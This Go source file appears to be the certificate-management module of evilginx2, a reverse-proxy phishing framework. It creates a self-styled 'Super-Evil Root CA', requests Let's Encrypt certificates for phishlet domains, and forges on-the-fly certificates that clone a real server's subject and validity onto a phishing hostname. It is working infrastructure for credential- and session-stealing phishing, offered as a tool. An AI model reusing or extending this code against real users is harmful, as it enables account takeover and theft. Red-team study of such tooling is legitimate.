package core

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"math/big"
	"os"
	"path/filepath"
	"time"

	"github.com/kgretzky/evilginx2/log"

	"github.com/go-acme/lego/v3/certcrypto"
	"github.com/go-acme/lego/v3/certificate"
	"github.com/go-acme/lego/v3/challenge"
	"github.com/go-acme/lego/v3/lego"
	legolog "github.com/go-acme/lego/v3/log"
	"github.com/go-acme/lego/v3/registration"
)

const HOSTS_DIR = "hosts"

type CertDb struct {
	PrivateKey    *rsa.PrivateKey
	CACert        tls.Certificate
	client        *lego.Client
	certUser      CertUser
	dataDir       string
	ns            *Nameserver
	hs            *HttpServer
	cfg           *Config
	hostCache     map[string]*tls.Certificate
	phishletCache map[string]map[string]*tls.Certificate
	tls_cache     map[string]*tls.Certificate
	httpChallenge *HTTPChallenge
}

type CertUser struct {
	Email        string
	Registration *registration.Resource
	key          crypto.PrivateKey
}

func (u CertUser) GetEmail() string {
	return u.Email
}

func (u CertUser) GetRegistration() *registration.Resource {
	return u.Registration
}

func (u CertUser) GetPrivateKey() crypto.PrivateKey {
	return u.key
}

type HTTPChallenge struct {
	crt_db *CertDb
}

func (ch HTTPChallenge) Present(domain, token, keyAuth string) error {
	ch.crt_db.hs.AddACMEToken(token, keyAuth)
	return nil
}

func (ch HTTPChallenge) CleanUp(domain, token, keyAuth string) error {
	ch.crt_db.hs.ClearACMETokens()
	return nil
}

const acmeURL = "https://acme-v02.api.letsencrypt.org/directory"

//const acmeURL = "https://acme-staging-v02.api.letsencrypt.org/directory"

func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*CertDb, error) {
	d := &CertDb{
		cfg:     cfg,
		dataDir: data_dir,
		ns:      ns,
		hs:      hs,
	}

	legolog.Logger = log.NullLogger()
	d.hostCache = make(map[string]*tls.Certificate)
	d.phishletCache = make(map[string]map[string]*tls.Certificate)
	d.tls_cache = make(map[string]*tls.Certificate)

	pkey_pem, err := ioutil.ReadFile(filepath.Join(data_dir, "private.key"))
	if err != nil {
		// private key corrupted or not found, recreate and delete all public certificates
		os.RemoveAll(filepath.Join(data_dir, "*"))

		d.PrivateKey, err = rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return nil, fmt.Errorf("private key generation failed")
		}
		pkey_pem = pem.EncodeToMemory(&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(d.PrivateKey),
		})
		err = ioutil.WriteFile(filepath.Join(data_dir, "private.key"), pkey_pem, 0600)
		if err != nil {
			return nil, err
		}
	} else {
		block, _ := pem.Decode(pkey_pem)
		if block == nil {
			return nil, fmt.Errorf("private key is corrupted")
		}

		d.PrivateKey, err = x509.ParsePKCS1PrivateKey(block.Bytes)
		if err != nil {
			return nil, err
		}
	}

	ca_crt_pem, err := ioutil.ReadFile(filepath.Join(data_dir, "ca.crt"))
	if err != nil {
		notBefore := time.Now()
		aYear := time.Duration(10*365*24) * time.Hour
		notAfter := notBefore.Add(aYear)
		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
		if err != nil {
			return nil, err
		}

		template := x509.Certificate{
			SerialNumber: serialNumber,
			Subject: pkix.Name{
				Country:            []string{},
				Locality:           []string{},
				Organization:       []string{"Evilginx Signature Trust Co."},
				OrganizationalUnit: []string{},
				CommonName:         "Evilginx Super-Evil Root CA",
			},
			NotBefore:             notBefore,
			NotAfter:              notAfter,
			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
			BasicConstraintsValid: true,
			IsCA:                  true,
		}

		cert, err := x509.CreateCertificate(rand.Reader, &template, &template, &d.PrivateKey.PublicKey, d.PrivateKey)
		if err != nil {
			return nil, err
		}
		ca_crt_pem = pem.EncodeToMemory(&pem.Block{
			Type:  "CERTIFICATE",
			Bytes: cert,
		})
		err = ioutil.WriteFile(filepath.Join(data_dir, "ca.crt"), ca_crt_pem, 0600)
		if err != nil {
			return nil, err
		}
	}

	d.CACert, err = tls.X509KeyPair(ca_crt_pem, pkey_pem)
	if err != nil {
		return nil, err
	}

	return d, nil
}

func (d *CertDb) Reset() {
	d.certUser.Email = "" //hostmaster@" + d.cfg.GetBaseDomain()
}

func (d *CertDb) SetupHostnameCertificate(hostname string) error {
	err := d.loadHostnameCertificate(hostname)
	if err != nil {
		log.Warning("failed to load certificate files for hostname '%s': %v", hostname, err)
		log.Info("requesting SSL/TLS certificates from LetsEncrypt...")
		err = d.obtainHostnameCertificate(hostname)
		if err != nil {
			return err
		}
	}
	return nil
}

func (d *CertDb) GetHostnameCertificate(hostname string) (*tls.Certificate, error) {
	cert, ok := d.hostCache[hostname]
	if ok {
		return cert, nil
	}
	return nil, fmt.Errorf("certificate for hostname '%s' not found", hostname)
}

func (d *CertDb) addHostnameCertificate(hostname string, cert *tls.Certificate) {
	d.hostCache[hostname] = cert
}

func (d *CertDb) loadHostnameCertificate(hostname string) error {
	crt_dir := filepath.Join(d.dataDir, HOSTS_DIR)

	cert, err := tls.LoadX509KeyPair(filepath.Join(crt_dir, hostname+".crt"), filepath.Join(crt_dir, hostname+".key"))
	if err != nil {
		return err
	}
	d.addHostnameCertificate(hostname, &cert)
	return nil
}

func (d *CertDb) obtainHostnameCertificate(hostname string) error {
	if err := CreateDir(filepath.Join(d.dataDir, HOSTS_DIR), 0700); err != nil {
		return err
	}
	crt_dir := filepath.Join(d.dataDir, HOSTS_DIR)

	domains := []string{hostname}
	cert_res, err := d.registerCertificate(domains)
	if err != nil {
		return err
	}

	cert, err := tls.X509KeyPair(cert_res.Certificate, cert_res.PrivateKey)
	if err != nil {
		return err
	}
	d.addHostnameCertificate(hostname, &cert)

	err = ioutil.WriteFile(filepath.Join(crt_dir, hostname+".crt"), cert_res.Certificate, 0600)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(filepath.Join(crt_dir, hostname+".key"), cert_res.PrivateKey, 0600)
	if err != nil {
		return err
	}

	return nil
}

func (d *CertDb) SetupPhishletCertificate(site_name string, domains []string) error {
	base_domain, ok := d.cfg.GetSiteDomain(site_name)
	if !ok {
		return fmt.Errorf("phishlet '%s' not found", site_name)
	}

	err := d.loadPhishletCertificate(site_name, base_domain)
	if err != nil {
		log.Warning("failed to load certificate files for phishlet '%s', domain '%s': %v", site_name, base_domain, err)
		log.Info("requesting SSL/TLS certificates from LetsEncrypt...")
		err = d.obtainPhishletCertificate(site_name, base_domain, domains)
		if err != nil {
			return err
		}
	}
	return nil
}

func (d *CertDb) GetPhishletCertificate(site_name string, base_domain string) (*tls.Certificate, error) {
	m, ok := d.phishletCache[base_domain]
	if ok {
		cert, ok := m[site_name]
		if ok {
			return cert, nil
		}
	}
	return nil, fmt.Errorf("certificate for phishlet '%s' and domain '%s' not found", site_name, base_domain)
}

func (d *CertDb) addPhishletCertificate(site_name string, base_domain string, cert *tls.Certificate) {
	_, ok := d.phishletCache[base_domain]
	if !ok {
		d.phishletCache[base_domain] = make(map[string]*tls.Certificate)
	}
	d.phishletCache[base_domain][site_name] = cert
}

func (d *CertDb) loadPhishletCertificate(site_name string, base_domain string) error {
	crt_dir := filepath.Join(d.dataDir, base_domain)

	cert, err := tls.LoadX509KeyPair(filepath.Join(crt_dir, site_name+".crt"), filepath.Join(crt_dir, site_name+".key"))
	if err != nil {
		return err
	}
	d.addPhishletCertificate(site_name, base_domain, &cert)
	return nil
}

func (d *CertDb) obtainPhishletCertificate(site_name string, base_domain string, domains []string) error {
	if err := CreateDir(filepath.Join(d.dataDir, base_domain), 0700); err != nil {
		return err
	}
	crt_dir := filepath.Join(d.dataDir, base_domain)

	cert_res, err := d.registerCertificate(domains)
	if err != nil {
		return err
	}

	cert, err := tls.X509KeyPair(cert_res.Certificate, cert_res.PrivateKey)
	if err != nil {
		return err
	}

	d.addPhishletCertificate(site_name, base_domain, &cert)

	err = ioutil.WriteFile(filepath.Join(crt_dir, site_name+".crt"), cert_res.Certificate, 0600)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(filepath.Join(crt_dir, site_name+".key"), cert_res.PrivateKey, 0600)
	if err != nil {
		return err
	}

	return nil
}

func (d *CertDb) registerCertificate(domains []string) (*certificate.Resource, error) {
	var err error
	d.certUser = CertUser{
		Email: "", //hostmaster@" + d.cfg.GetBaseDomain(),
		key:   d.PrivateKey,
	}

	config := lego.NewConfig(&d.certUser)
	config.CADirURL = acmeURL
	config.Certificate.KeyType = certcrypto.RSA2048

	d.client, err = lego.NewClient(config)
	if err != nil {
		return nil, err
	}

	d.httpChallenge = &HTTPChallenge{crt_db: d}

	d.client.Challenge.SetHTTP01Provider(d.httpChallenge)
	d.client.Challenge.Remove(challenge.TLSALPN01)

	reg, err := d.client.Registration.Register(registration.RegisterOptions{TermsOfServiceAgreed: true})
	if err != nil {
		return nil, err
	}
	d.certUser.Registration = reg

	req := certificate.ObtainRequest{
		Domains: domains,
		Bundle:  true,
	}

	cert_res, err := d.client.Certificate.Obtain(req)
	if err != nil {
		return nil, err
	}

	return cert_res, nil
}

func (d *CertDb) getServerCertificate(host string, port int) *x509.Certificate {
	log.Debug("Fetching TLS certificate from %s:%d ...", host, port)

	config := tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &config)
	if err != nil {
		log.Warning("Could not fetch TLS certificate from %s:%d: %s", host, port, err)
		return nil
	}
	defer conn.Close()

	state := conn.ConnectionState()

	return state.PeerCertificates[0]
}

func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
	var x509ca *x509.Certificate
	var template x509.Certificate

	cert, ok := d.tls_cache[host]
	if ok {
		return cert, nil
	}

	if x509ca, err = x509.ParseCertificate(d.CACert.Certificate[0]); err != nil {
		return
	}

	if phish_host == "" {
		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
		if err != nil {
			return nil, err
		}

		template = x509.Certificate{
			SerialNumber:          serialNumber,
			Issuer:                x509ca.Subject,
			Subject:               pkix.Name{Organization: []string{"Evilginx Signature Trust Co."}},
			NotBefore:             time.Now(),
			NotAfter:              time.Now().Add(time.Hour * 24 * 180),
			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
			DNSNames:              []string{host},
			BasicConstraintsValid: true,
		}
		template.Subject.CommonName = host
	} else {
		srvCert := d.getServerCertificate(host, port)
		if srvCert == nil {
			return nil, fmt.Errorf("failed to get TLS certificate for: %s", host)
		} else {
			serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
			serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
			if err != nil {
				return nil, err
			}

			template = x509.Certificate{
				SerialNumber:          serialNumber,
				Issuer:                x509ca.Subject,
				Subject:               srvCert.Subject,
				NotBefore:             srvCert.NotBefore,
				NotAfter:              srvCert.NotAfter,
				KeyUsage:              srvCert.KeyUsage,
				ExtKeyUsage:           srvCert.ExtKeyUsage,
				IPAddresses:           srvCert.IPAddresses,
				DNSNames:              []string{phish_host},
				BasicConstraintsValid: true,
			}
			template.Subject.CommonName = phish_host
		}
	}

	var pkey *rsa.PrivateKey
	if pkey, err = rsa.GenerateKey(rand.Reader, 1024); err != nil {
		return
	}

	var derBytes []byte
	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, d.CACert.PrivateKey); err != nil {
		return
	}

	cert = &tls.Certificate{
		Certificate: [][]byte{derBytes, d.CACert.Certificate[0]},
		PrivateKey:  pkey,
	}

	d.tls_cache[host] = cert
	return cert, nil
}
